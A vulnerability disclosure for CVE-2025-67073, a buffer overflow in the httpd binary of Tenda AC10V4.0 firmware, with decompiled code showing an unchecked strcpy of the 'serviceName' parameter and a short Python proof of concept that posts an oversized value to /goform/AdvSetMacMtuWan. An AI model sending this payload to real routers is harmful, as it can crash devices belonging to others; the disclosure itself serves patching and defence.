# CVE-2025-67073

Buffer Overflow in fromAdvSetMacMtuWan

## Affected model(s) and firmware/software version(s)

Vendor: Tenda

Product: AC10V4.0

Version: V16.03.10.20

Binary: `/bin/httpd`

## Vulnerability description and potential impacts

In function `fromAdvSetMacMtuWan`, it will run the function at address 0x45C380 when v3 is larger than 0, which get from `wans.flag` and we can set it from another function, so v3 can have value 1 and it will execute function sub_45C380 with param2 is 1:

```c
void __fastcall fromAdvSetMacMtuWan(_DWORD *a1)
{
    ...
    GetValue("wans.flag", v4);
    v3 = atoi((const char *)v4);
    if ( websSafeGetVar((int)a1, 113, (int)"wanMTU", (int)&unk_4F6AD8, (char *)&dest) == 1 )
    {
        ...
    }
    else
    {
        for ( i = 0; i < v3; ++i )
        {
            if ( sub_45C380((int)a1, i + 1, (int)&v12[612 * i]) )
                v1 = sub_45D720((int)a1, i + 1, &v12[612 * i]);
        }
        websTransfer_errCode(a1, v1);
    }
}
```

In sub_45C380, a3 is an address so the condition `if (a3)` is always true. As mentions before, a2 is 1 so the condition `if (a2==1)` is true and the code inside that block will be executed:

```c
int __fastcall sub_45C380(int a1, int a2, int a3)
{
    ...
    if ( a3 )
    {
        sprintf((char *)v16, "wan%d.connecttype", a2);
        GetValue(v16, a3);
        v15 = atoi((const char *)a3);
        if ( a2 == 1 )
        {
            ...
            v8 = websGetVar(a1, "serviceName", (int)&unk_4F6AD8);
            strcpy((char *)(a3 + 98), v8);   //   <-- buffer overflow
            v9 = websGetVar(a1, "serverName", (int)&unk_4F6AD8);
        }
        ...
    }
    ...
}
```

## Proof-of-concept (PoC) or exploit code for the issue

```python
#!/usr/bin/env python

import requests

URL = 'http://169.254.4.1'

data = {
    'wanMTU': '1281',
    'wanSpeed': '0',
    'cloneType': '0',
    'mac': '00:00:00:00:00:00',
    'serviceName': 'A'*0x800,
}

res = requests.post(f'{URL}/goform/AdvSetMacMtuWan', data=data)
print(res.content)
```

![](.images/poc.png)

## Any suggested solutions to fix this

Limit number of bytes read to buffer in function `serviceName`

## Severity (e.g. CVSS v3.x)

DOS, Command injection

## Acknowledgement

Nguyen Huu Tri, Cao Ngoc Quy and Nguyen Le Quoc Anh of bl4ckh0l3 from Galaxy One
